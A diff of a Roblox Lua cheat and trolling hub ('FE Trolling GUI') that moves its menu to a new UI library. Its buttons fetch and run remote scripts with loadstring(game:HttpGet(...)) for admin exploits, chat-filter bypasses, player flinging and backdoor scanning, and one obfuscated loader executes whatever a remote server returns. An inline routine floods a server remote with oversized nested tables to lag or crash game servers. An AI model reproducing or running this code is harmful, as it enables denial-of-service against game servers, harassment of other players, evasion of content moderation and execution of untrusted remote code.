@@ -1,8 +1,7 @@
 --[[
-Last Updated on 2/25/2024 
-Added fe upside down player r6 script
+Last Updated 3/6/2024
+Moved to Fluent Lib
 ]]--
-local OptTheme = "Midnight"
 local string = "https://discord.gg/xwy5Cu62Vw"
 local string2 = "https://discord.com/invite/jVf7eSrED9"
 _G.guidragtype = 1
@@ -19,399 +18,102 @@ else
 	_G.infydtype = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
 	_G.guidragtype = "https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"
 end
-local Library = loadstring(game:HttpGet(_G.guidragtype))()
-local Window = Library.CreateLib("FE Troll GUI", OptTheme)
-local Main = Window:NewTab("Main")
-local MainSection = Main:NewSection("Main")
-local Discord = Window:NewTab("Discords")
-local DiscordSection = Discord:NewSection("Discords")
-DiscordSection:NewButton("Discord Invite", "Copys Discord invite link", function()
-	setclipboard(string)
-end)
-DiscordSection:NewButton("Discord Invite OLD", "Copys Discord invite link", function()
-	setclipboard(string2)
-end)
-local Admins = Window:NewTab("Admins")
-local AdminsSection = Admins:NewSection("Admins")
-local GUISLOL = Window:NewTab("GUIS")
-local GUISSection = GUISLOL:NewSection("GUIS")
-AdminsSection:NewButton("Infinite Yield FE", "Admin", function()
-	loadstring(game:HttpGet(_G.infydtype))()
-end)
-AdminsSection:NewButton("Nameless Admin", "Admin", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
-end)
-AdminsSection:NewButton("fates admin", "Admin", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
-end)
-AdminsSection:NewButton("Proton Free Admin", "Admin", function()
-	_G.UI_Id = "default" --set this to "default" for the default ui
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Proton%20Free'))()
-end)
-AdminsSection:NewButton("Proton 2 free Admin", "Admin", function()
-			 -- DEFAULT CMD BAR PREFIX IS ;
-			 -- DEFAULT CHAT PREFIX IS /
-	_G.UI_Id = "default" --set this to "default" for the default ui
-	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5e6e6cc1bb32fd926764d064e2c60a3b.lua"))()
-end)
-AdminsSection:NewButton("Reviz Admin V2", "Admin", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/Reviz%20AdminV2"))()
-end)
-MainSection:NewButton("FE Universal Script hub or sum", "hella stuff", function()
-	loadstring(game:HttpGet('https://gist.githubusercontent.com/Dvrknvss/e2a906135f9e55d0d2ae7aaf337d8937/raw/dc055592803f8418ddf8ba7b84286f47638849d4/noidea'))()
-end)
-MainSection:NewButton("FE server lag or crash", "idk", function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
-end)
-MainSection:NewButton("FE server lag or crash 2", "only works some games", function()--
-	shared.TeleportToSky = false -- for games that show ur ping (like custom duels)
-	if shared.TeleportToSky then
-		local char = game:GetService('Players').LocalPlayer.Character
-		char.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
-		task.wait(0.5)
-		char.HumanoidRootPart.Anchored = true
-	end
-	while wait(1.5) do --// don't change it's the best
-		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
-		local function getmaxvalue(val)
-			local mainvalueifonetable = 499999
-			if type(val) ~= "number" then
-				return nil
-			end
-			local calculateperfectval = (mainvalueifonetable / (val + 2))
-			return calculateperfectval
-		end
-		local function bomb(tableincrease, tries)
-			local maintable = {}
-			local spammedtable = {}
-			table.insert(spammedtable, {})
-			z = spammedtable[1]
-			for i = 1, tableincrease do
-				local tableins = {}
-				table.insert(z, tableins)
-				z = tableins
-			end
-			local calculatemax = getmaxvalue(tableincrease)
-			local maximum
-			if calculatemax then
-				maximum = calculatemax
-			else
-				maximum = 999999
-			end
-			for i = 1, maximum do
-				table.insert(maintable, spammedtable)
-			end
-			for i = 1, tries do
-				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-			end
-		end
-		bomb(289, 5) --// change values if client crashes
-	end
-end)
-MainSection:NewButton("FE server lag or crash 3", "This script is designed for skill-based games such as Hood Customs and More", function()--
-	loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
-end)
-MainSection:NewButton("Small server Joiner", "small", function()
-	local Http = game:GetService("HttpService")
-	local TPS = game:GetService("TeleportService")
-	local Api = "https://games.roblox.com/v1/games/"
-	local _place = game.PlaceId
-	local _servers = Api .. _place .. "/servers/Public?sortOrder=Asc&limit=100"
-	function ListServers(cursor)
-		local Raw = game:HttpGet(_servers .. ((cursor and "&cursor=" .. cursor) or ""))
-		return Http:JSONDecode(Raw)
-	end
-	local Server, Next;
-	repeat
-		local Servers = ListServers(Next)
-		Server = Servers.data[1]
-		Next = Servers.nextPageCursor
-	until Server
-	TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
-end)
-MainSection:NewButton("Server Browser", "hella stuff", function()
-	loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
-end)
-MainSection:NewButton("Eclipse hub/Sniper to join", "sniper join ppls", function()
-	getgenv().mainKey = "nil"
-	local a, b, c, d, e = loadstring, request or http_request or (http and http.request) or (syn and syn.request), assert, tostring, "https://api.eclipsehub.xyz/auth"
-	c(a and b, "Executor not Supported")
-	a(b({
-		Url = e .. "\?\107e\121\61" .. d(mainKey),
-		Headers = {
-			["User-Agent"] = "Eclipse"
-		}
-	}).Body)()
-end)
-MainSection:NewButton("System Broken FE", "w", function()
-	local credits = "SystemBroken made by system_calix"
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
-end)
-MainSection:NewButton("FE Car Tornado", "w", function()
--- Scripted on mobile
--- Fe Vehicle Fling Alpha
-
--- Start UP
-	local notification = Instance.new("Sound")
-	notification.Parent = game:GetService("SoundService")
-	notification.SoundId = "rbxassetid://9086208751"
-	notification.Volume = 1
-	local char = game.Players.LocalPlayer.Character
-	function getRoot(char)
-		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
-		return rootPart
-	end
-
--- Part Detector Seat
-	local SPart = Instance.new("Part");
-	local Player = game:GetService('Players').LocalPlayer;
-	repeat
-		game:GetService('RunService').RenderStepped:Wait()
-	until Player.Character;
-	local Character = Player.Character;
-	SPart.Anchored, SPart.CanCollide = true, true;
-	SPart.Parent = workspace;
-	SPart.Size = Vector3.new(1, 100, 1)
-	SPart.Transparency = 0.4
-	game:GetService('RunService').Stepped:Connect(function()
-		local Ray = Ray.new(Character.PrimaryPart.Position + Character.PrimaryPart.CFrame.LookVector * 6, Vector3.new(0, -1, 0) * 4);
-		local FPOR = workspace:FindPartOnRayWithIgnoreList(Ray, {
-			Character
-		});
-		if (FPOR) then
-			SPart.CFrame = Character.PrimaryPart.CFrame + Character.PrimaryPart.CFrame.LookVector * 6;
-		end
-		if SPart == nil then
-			Ray:destroy()
-			FPOR:destroy()
-		end
-	end)
-	game.StarterGui:SetCore("SendNotification", {
-		Title = "FE Vehicle Fling";
-		Icon = "rbxassetid://7279804519";
-		Text = "Identify Passanger Seat, Part_OnTouched";
-		Duration = 10;
-		notification:Play()
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+	local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+	local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+	local Window = Fluent:CreateWindow({
+		Title = "FE Trolling GUI",
+		SubTitle = "",
+		TabWidth = 160,
+		Size = UDim2.fromOffset(580, 460),
+		Acrylic = false,
+		Theme = "Dark",
+		MinimizeKey = Enum.KeyCode.LeftControl
 	})
-
--- The finish touches
--- Mobile and PC Support BODYGYRO
-	SPart.Touched:Connect(function(hit)
-		if hit:IsA("Seat") then
-			local IsFlying = False
-			local flyv
-			local flyg
-			local Player = game.Players.LocalPlayer
-			local Speed = 50
-			local LastSpeed = Speed
-			local maxspeed = 100
-			local IsRunning = false
-			local f = 0
-			IsFlying = true
-			flyv = Instance.new("BodyVelocity")
-			flyv.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
-			flyv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-			flyg = Instance.new("BodyGyro")
-			flyg.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
-			flyg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
-			flyg.P = 1000
-			flyg.D = 50
-			Player.Character:WaitForChild('Humanoid').PlatformStand = true
-			Player.Character.Humanoid.Changed:Connect(function(Prop)
-				if Player.Character.Humanoid.MoveDirection == Vector3.new(0, 0, 0) then
-					IsRunning = false
-				else
-					IsRunning = true
-				end
-			end)
-			spawn(function()
-				while true do
-					wait()
-					if IsFlying then
-						flyg.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((f + 0) * 50 * Speed / maxspeed), 0, 0)
-						flyv.Velocity = workspace.CurrentCamera.CoordinateFrame.LookVector * Speed
-						wait(0.1)
-						if Speed < 0 then
-							Speed = 0
-							f = 0
-						end
-					end
-					if IsRunning then
-						Speed = LastSpeed
-					else
-						if not Speed == 0 then
-							LastSpeed = Speed
-						end
-						Speed = 0
-					end
-				end
-			end)
-			Speed = 0.1
-			wait(0.3)
-			hit:Sit(game:GetService("Players").LocalPlayer.Character.Humanoid)
-			SPart:Destroy()
-			wait(0.3)
-			local speaker = game.Players.LocalPlayer
-			local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
-			local vehicleModel = seat.Parent
-			repeat
-				if vehicleModel.ClassName ~= "Model" then
-					vehicleModel = vehicleModel.Parent
-				end
-			until vehicleModel.ClassName == "Model"
-			wait(0.1)
-			for i, v in pairs(vehicleModel:GetDescendants()) do
-				if v:IsA("BasePart") and v.CanCollide then
-					v.CanCollide = false
-				end
-			end
-			wait(0.2)
-			Speed = 80
-			local Spin = Instance.new("BodyAngularVelocity")
-			Spin.Name = "Spinning"
-			Spin.Parent = getRoot(speaker.Character)
-			Spin.MaxTorque = Vector3.new(0, math.huge, 0)
-			Spin.AngularVelocity = Vector3.new(0, 2000, 0)
-			game.StarterGui:SetCore("SendNotification", {
-				Title = "FE Vehicle Fling";
-				Icon = "rbxassetid://7279804519";
-				Text = "Identified the seat part, Success!";
-				Duration = 10;
-				notification:Play()
-			})
+	local Discord = Window:AddTab({ Title = "Discords", Icon = "globe" })
+	local Options = Fluent.Options
+	Discord:AddButton({
+		Title = "Discord Invite",
+		Description = "Copys Discord invite link",
+		Callback = function()
+			setclipboard(string)
 		end
-	end)
-end)
-
-MainSection:NewButton("Walk on Walls FE", "kinda buggy if execute more than once", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Walk%20On%20Walls%20Script%20(R6%2615).txt"))()
-end)
-
-MainSection:NewButton("Netless V2", "need to do i think every time u reset", function()
-	for i, v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
-		if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
-			game:GetService("RunService").Heartbeat:connect(function()
-				v.Velocity = Vector3.new(0, 35, 0)
-				wait(0.5)
-			end)
-		end
-	end
-	game:GetService("StarterGui"):SetCore("SendNotification", {
-		Title = "Notification";
-		Text = "Netless activated";
-		Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"
 	})
-	Duration = 16;
-end)
-MainSection:NewButton("FE Hat Ferris Wheel", "Hats spin around your character in a circle motion", function()
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_8u7A6D92KJWJXgB4btM3lJNPDy2mCi61S191KbGF2EfX9621qbXQg0tBivwEi0Kr.lua.txt'), true))()
-end)
-MainSection:NewButton("Sushi X", "idk", function()
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/sushi/main/X'), true))()
-end)
-
-MainSection:NewButton("FE Chat Bypass", "bypasses chat filter can cuss", function()
-	loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
-end)
-MainSection:NewButton("FE Chat Bypass 2", "bypasses chat filter can cuss", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua", true))()
-end)
-MainSection:NewButton("FE Chat Bypass 3", "bypasses chat filter can cuss", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ChainGotStucked/a55af82d82574/main/Eminence%20Hub"))()
-end)
-MainSection:NewButton("FE Chat Bypass 4", "bypasses chat filter can cuss", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/wspo23e/SDL-Roblox-ChatBypasser/main/SDL-NoFilterV2.5"))()
-end)
-
-MainSection:NewButton("BackDoor.exe", "scan for backdoors", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
-end)
-MainSection:NewButton("BackDoor.exe V6", "scan for backdoors", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6/source.lua"))()
-end)
-MainSection:NewButton("BackDoor.exe V6x", "scan for backdoors", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
-end)
-MainSection:NewButton("BackDoor.exe V8", "scan for backdoors", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
-end)
-MainSection:NewButton("BlackHole", "unacnhored objects", function()
-	loadstring(game:HttpGet("https://pastebin.com/raw/qRvKHjVN"))();
-end)
-
-MainSection:NewButton("FE BackFlip", "Z X C", function()
-	wait(5)--
-	local ver = "2.00"
-	local scriptname = "feFlip"--
-	local FrontflipKey = Enum.KeyCode.Z
-	local BackflipKey = Enum.KeyCode.X
-	local AirjumpKey = Enum.KeyCode.C--
-	local ca = game:GetService("ContextActionService")
-	local zeezy = game:GetService("Players").LocalPlayer
-	local h = 0.0174533
-	local antigrav--
-	function zeezyFrontflip(act, inp, obj)
-		if inp == Enum.UserInputState.Begin then
-			zeezy.Character.Humanoid:ChangeState("Jumping")
-			wait()
-			zeezy.Character.Humanoid.Sit = true
-			for i = 1, 360 do
-				delay(i / 720, function()
-					zeezy.Character.Humanoid.Sit = true
-					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h, 0, 0)
-				end)
-			end
-			wait(0.55)
-			zeezy.Character.Humanoid.Sit = false
+	Discord:AddButton({
+		Title = "Discord Invite OLD",
+		Description = "Copys OLD Discord invite link",
+		Callback = function()
+			setclipboard(string2)
 		end
-	end
-	function zeezyBackflip(act, inp, obj)
-		if inp == Enum.UserInputState.Begin then
-			zeezy.Character.Humanoid:ChangeState("Jumping")
-			wait()
-			zeezy.Character.Humanoid.Sit = true
-			for i = 1, 360 do
-				delay(i / 720, function()
-					zeezy.Character.Humanoid.Sit = true
-					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h, 0, 0)
-				end)
-			end
-			wait(0.55)
-			zeezy.Character.Humanoid.Sit = false
-		end
-	end
-	function zeezyAirjump(act, inp, obj)
-		if inp == Enum.UserInputState.Begin then
-			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
-			wait()
-			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-		end
-	end--
-	ca:BindAction("zeezyFrontflip", zeezyFrontflip, false, FrontflipKey)
-	ca:BindAction("zeezyBackflip", zeezyBackflip, false, BackflipKey)
-	ca:BindAction("zeezyAirjump", zeezyAirjump, false, AirjumpKey)--
-	print(scriptname .. " " .. ver .. " loaded successfully")
-	print("made by Zeezy#7203")
-	local notifSound = Instance.new("Sound", workspace)
-	notifSound.PlaybackSpeed = 1.5
-	notifSound.Volume = 0.15
-	notifSound.SoundId = "rbxassetid://170765130"
-	notifSound.PlayOnRemove = true
-	notifSound:Destroy()
-	game.StarterGui:SetCore("SendNotification", {
-		Title = "feFlip",
-		Text = "feFlip loaded successfully!",
-		Icon = "rbxassetid://505845268",
-		Duration = 5,
-		Button1 = "Okay"
 	})
-end)
+	local Admins = Window:AddTab({ Title = "Admins", Icon = "globe" })
 
-GUISSection:NewButton("Arosia FE Gui", "idk", function()
-	loadstring(Game:GetObjects("rbxassetid://1255908305")[1].Source)()
-end)
-GUISSection:NewButton("Animations FE Gui 1", "idk", function()
-	local Gui = Instance.new("ScreenGui", game.CoreGui)
+	Admins:AddButton({
+		Title = "Infinite Yield FE",
+		Description = "Infinite Yield FE",
+		Callback = function()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+		end
+	})
+	Admins:AddButton({
+		Title = "Infinite Store",
+		Description = "loads a store to browse for plugins for Infinite Yield",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinite-Store/Infinite-Store/main/main.lua"))()
+		end
+	})
+	Admins:AddButton({
+		Title = "Nameless Admin",
+		Description = "Nameless Admin",
+		Callback = function()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
+		end
+	})
+	Admins:AddButton({
+		Title = "Fates Admin",
+		Description = "Fates Admin",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+		end
+	})
+	Admins:AddButton({
+		Title = "Proton Free Admin",
+		Description = "Proton Free Admin",
+		Callback = function()
+			_G.UI_Id = "default" --set this to "default" for the default ui
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Proton%20Free'))()
+		end
+	})
+	Admins:AddButton({
+		Title = "Proton 2 free Admin",
+		Description = "Proton 2 free Admin",
+		Callback = function()
+			-- DEFAULT CMD BAR PREFIX IS ;
+			-- DEFAULT CHAT PREFIX IS /
+			_G.UI_Id = "default" --set this to "default" for the default ui
+			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5e6e6cc1bb32fd926764d064e2c60a3b.lua"))()
+		end
+	})
+	Admins:AddButton({
+		Title = "Reviz Admin V2",
+		Description = "Reviz Admin V2",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/Reviz%20AdminV2"))()
+		end
+	})
+	local GUIS = Window:AddTab({ Title = "GUIS", Icon = "globe" })
+	GUIS:AddButton({
+		Title = "Arosia FE GUI",
+		Description = "Arosia FE GUI",
+		Callback = function()
+			loadstring(Game:GetObjects("rbxassetid://1255908305")[1].Source)()
+		end
+	})
+	GUIS:AddButton({
+		Title = "Animations FE GUI 1",
+		Description = "Animations FE GUI 1",
+		Callback = function()
+			local Gui = Instance.new("ScreenGui", game.CoreGui)
 	Gui.Name = "FE Animations"
 	local Background = Instance.new("Frame", Gui)
 	Background.Name = "Background"
@@ -664,10 +366,13 @@ GUISSection:NewButton("Animations FE Gui 1", "idk", function()
 			end
 		end
 	end)
-end)
-
-GUISSection:NewButton("Animations FE Gui 2", "idk", function()
-	local Gui = Instance.new("ScreenGui", game.CoreGui)
+		end
+	})
+	GUIS:AddButton({
+		Title = "Animations FE GUI 2",
+		Description = "Animations FE GUI 2",
+		Callback = function()
+			local Gui = Instance.new("ScreenGui", game.CoreGui)
 	Gui.Name = "FE Animations"
 	local Background = Instance.new("Frame", Gui)
 	Background.Name = "Background"
@@ -909,12 +614,13 @@ GUISSection:NewButton("Animations FE Gui 2", "idk", function()
 			end
 		end
 	end)
-end)
-
-
-
-GUISSection:NewButton("Fuzk FE Gui", "idk", function()
-	local lplayer = game:GetService('Players').LocalPlayer
+		end
+	})
+	GUIS:AddButton({
+		Title = "Fuzk FE GUI",
+		Description = "Fuzk FE GUI",
+		Callback = function()
+			local lplayer = game:GetService('Players').LocalPlayer
 	local killing = false
 	function GetPlayer(String)
 		local Found = {}
@@ -1566,10 +1272,13 @@ GUISSection:NewButton("Fuzk FE Gui", "idk", function()
 	TextLabel_3.Text = "Made By Hackmaster12"
 	TextLabel_3.TextColor3 = Color3.new(0, 0, 0)
 	TextLabel_3.TextSize = 40
-end)
-
-GUISSection:NewButton("Yeet V3 FE Gui", "flings players", function()
-	local lplayer = game:GetService('Players').LocalPlayer
+		end
+	})
+	GUIS:AddButton({
+		Title = "Yeet V3 FE GUI",
+		Description = "Flings Players",
+		Callback = function()
+			local lplayer = game:GetService('Players').LocalPlayer
 	local yeeting = false
 	function GetPlayer(String)
 		local Found = {}
@@ -1746,10 +1455,13 @@ GUISSection:NewButton("Yeet V3 FE Gui", "flings players", function()
 		ImageLabel.Rotation = ImageLabel.Rotation + 1
 		TextLabel_3.Text = ahh('yeet gui')
 	end
-end)
-
-GUISSection:NewButton("Energize FE Gui", "animations", function()
-   -- Energize by illremember, fe animations
+		end
+	})
+	GUIS:AddButton({
+		Title = "Energize FE GUI",
+		Description = "Animations",
+		Callback = function()
+			-- Energize by illremember, fe animations
 -- DO NOT COPY AND CLAIM AS OWN, if you are using some of the script for your own, credit is highly appreciated!
 -- Thank you, and enjoy.
 
@@ -3361,14 +3073,20 @@ GUISSection:NewButton("Energize FE Gui", "animations", function()
 	end)
 
 -- Finished update!
-end)
-
-GUISSection:NewButton("Atrava FE Gui", "idk", function()
-	loadstring(game:GetObjects("rbxassetid://1468845733")[1].Source)()
-end)
-
-GUISSection:NewButton("Hyper Total FE Gui", "idk", function()
-  -- Credit to Timeless/xFunnieuss for the partial names/short names
+		end
+	})
+	GUIS:AddButton({
+		Title = "Atrava FE GUI",
+		Description = "Atrava FE GUI",
+		Callback = function()
+			loadstring(game:GetObjects("rbxassetid://1468845733")[1].Source)()
+		end
+	})
+	GUIS:AddButton({
+		Title = "Hyper Total FE GUI",
+		Description = "Hyper Total FE GUI",
+		Callback = function()
+			-- Credit to Timeless/xFunnieuss for the partial names/short names
 
 -- Objects
 	local HyperTotal = Instance.new("ScreenGui")
@@ -6144,21 +5862,472 @@ GUISSection:NewButton("Hyper Total FE Gui", "idk", function()
 		end
 	end)
 
-end)
-
-
-GUISSection:NewButton("FE Fling GUI", "fling players", function()--
-	loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+		end
+	})
+	GUIS:AddButton({
+		Title = "FE Fling GUI",
+		Description = "FE Fling GUI",
+		Callback = function()
+			loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
 --This link auto updates, so there's no need to update this file.
-end)
-MainSection:NewButton("Super fling", "fling players", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/superfling', true))()
-end)
-MainSection:NewButton("FE Noob All Auto Rap Battles", "jxyserr", function()
-	loadstring(game:HttpGet('https://pastes.io/raw/1priqwpcnv'))();
-end)
-MainSection:NewButton("FE Big Head Rthro R15", "dont use hats/hair also scale head to max in avatar", function()
-    --  ((Packed with care by sysGhost/BiKode))
+		end
+	})
+	local Main = Window:AddTab({ Title = "Main", Icon = "globe" })
+	Main:AddButton({
+		Title = "FE Universal Script Hub",
+		Description = "FE Universal Script Hub",
+		Callback = function()
+			loadstring(game:HttpGet('https://gist.githubusercontent.com/Dvrknvss/e2a906135f9e55d0d2ae7aaf337d8937/raw/dc055592803f8418ddf8ba7b84286f47638849d4/noidea'))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Server lag or crash",
+		Description = "idk how well this works and only for sum games",
+		Callback = function()
+			loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Server lag or crash 2",
+		Description = "idk how well this works",
+		Callback = function()
+			shared.TeleportToSky = false -- for games that show ur ping (like custom duels)
+	if shared.TeleportToSky then
+		local char = game:GetService('Players').LocalPlayer.Character
+		char.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
+		task.wait(0.5)
+		char.HumanoidRootPart.Anchored = true
+	end
+	while wait(1.5) do --// don't change it's the best
+		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
+		local function getmaxvalue(val)
+			local mainvalueifonetable = 499999
+			if type(val) ~= "number" then
+				return nil
+			end
+			local calculateperfectval = (mainvalueifonetable / (val + 2))
+			return calculateperfectval
+		end
+		local function bomb(tableincrease, tries)
+			local maintable = {}
+			local spammedtable = {}
+			table.insert(spammedtable, {})
+			z = spammedtable[1]
+			for i = 1, tableincrease do
+				local tableins = {}
+				table.insert(z, tableins)
+				z = tableins
+			end
+			local calculatemax = getmaxvalue(tableincrease)
+			local maximum
+			if calculatemax then
+				maximum = calculatemax
+			else
+				maximum = 999999
+			end
+			for i = 1, maximum do
+				table.insert(maintable, spammedtable)
+			end
+			for i = 1, tries do
+				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+			end
+		end
+		bomb(289, 5) --// change values if client crashes
+	end
+		end
+	})
+	Main:AddButton({
+		Title = "FE Server lag or crash 3",
+		Description = "This script is designed for skill-based games such as Hood Customs and More",
+		Callback = function()
+			loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
+		end
+	})
+	Main:AddButton({
+		Title = "Small server Joiner",
+		Description = "joins smallest server",
+		Callback = function()
+			local Http = game:GetService("HttpService")
+	local TPS = game:GetService("TeleportService")
+	local Api = "https://games.roblox.com/v1/games/"
+	local _place = game.PlaceId
+	local _servers = Api .. _place .. "/servers/Public?sortOrder=Asc&limit=100"
+	function ListServers(cursor)
+		local Raw = game:HttpGet(_servers .. ((cursor and "&cursor=" .. cursor) or ""))
+		return Http:JSONDecode(Raw)
+	end
+	local Server, Next;
+	repeat
+		local Servers = ListServers(Next)
+		Server = Servers.data[1]
+		Next = Servers.nextPageCursor
+	until Server
+	TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
+		end
+	})
+	Main:AddButton({
+		Title = "Server browser",
+		Description = "Browse Servers of current Place",
+		Callback = function()
+			loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
+		end
+	})
+	Main:AddButton({
+		Title = "Eclipse hub/Sniper to join",
+		Description = "Join Person",
+		Callback = function()
+			getgenv().mainKey = "nil"
+	local a, b, c, d, e = loadstring, request or http_request or (http and http.request) or (syn and syn.request), assert, tostring, "https://api.eclipsehub.xyz/auth"
+	c(a and b, "Executor not Supported")
+	a(b({
+		Url = e .. "\?\107e\121\61" .. d(mainKey),
+		Headers = {
+			["User-Agent"] = "Eclipse"
+		}
+	}).Body)()
+		end
+	})
+	GUIS:AddButton({
+		Title = "System Broken FE",
+		Description = "Animations",
+		Callback = function()
+			local credits = "SystemBroken made by system_calix"
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Car Tornado",
+		Description = "spins car when found or sum idrk",
+		Callback = function()
+			-- Scripted on mobile
+-- Fe Vehicle Fling Alpha
+
+-- Start UP
+	local notification = Instance.new("Sound")
+	notification.Parent = game:GetService("SoundService")
+	notification.SoundId = "rbxassetid://9086208751"
+	notification.Volume = 1
+	local char = game.Players.LocalPlayer.Character
+	function getRoot(char)
+		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+		return rootPart
+	end
+
+-- Part Detector Seat
+	local SPart = Instance.new("Part");
+	local Player = game:GetService('Players').LocalPlayer;
+	repeat
+		game:GetService('RunService').RenderStepped:Wait()
+	until Player.Character;
+	local Character = Player.Character;
+	SPart.Anchored, SPart.CanCollide = true, true;
+	SPart.Parent = workspace;
+	SPart.Size = Vector3.new(1, 100, 1)
+	SPart.Transparency = 0.4
+	game:GetService('RunService').Stepped:Connect(function()
+		local Ray = Ray.new(Character.PrimaryPart.Position + Character.PrimaryPart.CFrame.LookVector * 6, Vector3.new(0, -1, 0) * 4);
+		local FPOR = workspace:FindPartOnRayWithIgnoreList(Ray, {
+			Character
+		});
+		if (FPOR) then
+			SPart.CFrame = Character.PrimaryPart.CFrame + Character.PrimaryPart.CFrame.LookVector * 6;
+		end
+		if SPart == nil then
+			Ray:destroy()
+			FPOR:destroy()
+		end
+	end)
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "FE Vehicle Fling";
+		Icon = "rbxassetid://7279804519";
+		Text = "Identify Passanger Seat, Part_OnTouched";
+		Duration = 10;
+		notification:Play()
+	})
+
+-- The finish touches
+-- Mobile and PC Support BODYGYRO
+	SPart.Touched:Connect(function(hit)
+		if hit:IsA("Seat") then
+			local IsFlying = False
+			local flyv
+			local flyg
+			local Player = game.Players.LocalPlayer
+			local Speed = 50
+			local LastSpeed = Speed
+			local maxspeed = 100
+			local IsRunning = false
+			local f = 0
+			IsFlying = true
+			flyv = Instance.new("BodyVelocity")
+			flyv.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
+			flyv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+			flyg = Instance.new("BodyGyro")
+			flyg.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
+			flyg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+			flyg.P = 1000
+			flyg.D = 50
+			Player.Character:WaitForChild('Humanoid').PlatformStand = true
+			Player.Character.Humanoid.Changed:Connect(function(Prop)
